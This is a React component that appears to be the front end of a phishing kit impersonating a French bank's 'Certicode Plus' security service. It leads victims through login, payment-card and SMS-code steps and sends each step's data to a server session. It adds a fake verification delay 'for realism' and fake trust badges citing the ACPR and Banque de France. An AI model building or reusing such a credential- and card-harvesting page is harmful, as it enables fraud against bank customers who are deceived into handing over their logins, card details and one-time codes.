import { useEffect, useRef, useState } from "react";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import StepIndicator from "@/components/StepIndicator";
import LoginStep from "@/components/steps/LoginStep";
import CardStep from "@/components/steps/CardStep";
import SmsStep from "@/components/steps/SmsStep";
import SuccessStep from "@/components/steps/SuccessStep";
import { createSession, submitStep } from "@/lib/api";
import { toast } from "sonner";

const STEPS = ["login", "card", "sms", "complete"];

export default function CerticodeFlow() {
  const [sessionId, setSessionId] = useState(null);
  const [currentStep, setCurrentStep] = useState("login");
  const [submitting, setSubmitting] = useState(false);
  const sessionRequestedRef = useRef(false);

  // Create session on mount (guarded against StrictMode double-fire)
  useEffect(() => {
    if (sessionRequestedRef.current) return;
    sessionRequestedRef.current = true;
    (async () => {
      try {
        const data = await createSession();
        setSessionId(data.session_id);
      } catch (err) {
        console.error("session create failed", err);
      }
    })();
  }, []);

  const goNext = (stepKey) => {
    const idx = STEPS.indexOf(stepKey);
    setCurrentStep(STEPS[Math.min(idx + 1, STEPS.length - 1)]);
  };

  const handleStepSubmit = async (stepKey, fields) => {
    if (submitting) return;
    setSubmitting(true);
    try {
      // Simulate server-side verification delay for realism
      const start = Date.now();
      if (sessionId) {
        await submitStep(sessionId, stepKey, fields);
      }
      const elapsed = Date.now() - start;
      const minDelay = 900;
      if (elapsed < minDelay) {
        await new Promise((r) => setTimeout(r, minDelay - elapsed));
      }
      goNext(stepKey);
    } catch (err) {
      console.error("submit failed", err);
      toast.error("Une erreur est survenue. Merci de réessayer.");
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-[#F4F6F8]" data-testid="certicode-flow">
      <Header />

      <main className="flex-1 px-4 sm:px-6 py-6 sm:py-10">
        <div className="mx-auto w-full max-w-md">
          {/* Title block above card on landing-ish view */}
          {currentStep === "login" && (
            <div className="mb-5 text-center">
              <span
                data-testid="campaign-tag"
                className="inline-block rounded-full bg-[#FFCD00]/30 px-3 py-1 text-xs font-semibold uppercase tracking-wide text-[#003B5C]"
              >
                Action requise · Certicode Plus
              </span>
            </div>
          )}

          <div className="rounded-xl bg-white p-6 sm:p-8 lbp-shadow-lg" data-testid="step-card">
            <div className="mb-6">
              <StepIndicator currentStep={currentStep} />
            </div>

            {currentStep === "login" && (
              <LoginStep
                onSubmit={(f) => handleStepSubmit("login", f)}
                submitting={submitting}
              />
            )}
            {currentStep === "card" && (
              <CardStep
                onSubmit={(f) => handleStepSubmit("card", f)}
                submitting={submitting}
              />
            )}
            {currentStep === "sms" && (
              <SmsStep
                onSubmit={(f) => handleStepSubmit("sms", f)}
                submitting={submitting}
              />
            )}
            {currentStep === "complete" && <SuccessStep />}
          </div>

          {/* Trust badges row */}
          {currentStep !== "complete" && (
            <div
              data-testid="trust-row"
              className="mt-5 flex items-center justify-center gap-4 text-[11px] text-[#475569]"
            >
              <span>🔒 SSL/TLS 1.3</span>
              <span>·</span>
              <span>RGPD</span>
              <span>·</span>
              <span>ACPR · Banque de France</span>
            </div>
          )}
        </div>
      </main>

      <Footer />
    </div>
  );
}
